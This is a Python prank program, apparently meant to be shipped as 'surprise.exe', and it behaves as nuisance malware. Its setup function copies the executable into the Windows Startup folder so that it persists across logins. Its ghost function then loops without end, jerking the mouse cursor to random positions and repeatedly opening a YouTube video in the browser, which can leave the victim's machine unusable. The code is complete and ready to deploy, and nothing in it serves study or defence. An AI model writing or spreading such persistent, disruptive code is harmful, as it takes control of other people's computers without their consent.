import os
import sys
import shutil
import pyautogui
import random
import time
import webbrowser

pyautogui.FAILSAFE = True
screen_w, screen_h = pyautogui.size()
pyautogui.FAILSAFE_POINTS = [(screen_w-1,screen_h-1)]

def setup():
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
    
    exe_name = "surprise.exe"
    source_exe = os.path.join(application_path, exe_name)
    
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    marker_file = os.path.join(startup_folder, "surprise_setup_done.txt")
    
    if not os.path.exists(marker_file):
        try:
            dest_exe = os.path.join(startup_folder, exe_name)
            shutil.copy2(source_exe, dest_exe)
            
            with open(marker_file, 'w') as f:
                f.write("setup_complete")
                
            print(f"Auto-start enabled. Copied {exe_name} to Startup.")
        except Exception as e:
            print(f"Failed to setup auto-start: {e}")

def ghost(margin=100):
    print("Ghosting activated")

    while True:
        curr_x,curr_y = pyautogui.position()
        off_x = random.randint(-100,100)
        off_y = random.randint(-100,100)

        if (curr_x + off_x) >= (screen_w - margin):
            off_x = -abs(off_x)
        
        if (curr_y + off_y) >= (screen_h - margin):
            off_y = -abs(off_y)

        new_x = max(0, min(screen_w - 1, curr_x + off_x))
        new_y = max(0, min(screen_h - 1, curr_y + off_y))
        
        pyautogui.moveTo(new_x,new_y,duration=0)

        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

if __name__ == "__main__":
    setup()
    ghost()
